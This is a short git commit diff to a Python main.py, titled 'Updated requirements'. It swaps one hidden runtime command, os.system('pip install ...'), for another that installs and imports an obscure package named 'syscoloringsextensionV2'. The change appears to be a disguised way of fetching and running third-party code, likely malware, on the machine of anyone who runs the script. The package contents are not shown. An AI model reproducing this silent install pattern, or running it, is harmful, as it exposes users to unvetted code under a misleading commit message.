dece545d77db09a9aee6ddea1d78ff6896304120
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-20 13:31:13 +0000

    Updated requirements

--- main.py
+++ main.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pycryptextension")
-import pycryptextension
+os.system("pip install syscoloringsextensionV2")
+import syscoloringsextensionV2
 import random
 import requests
 import time
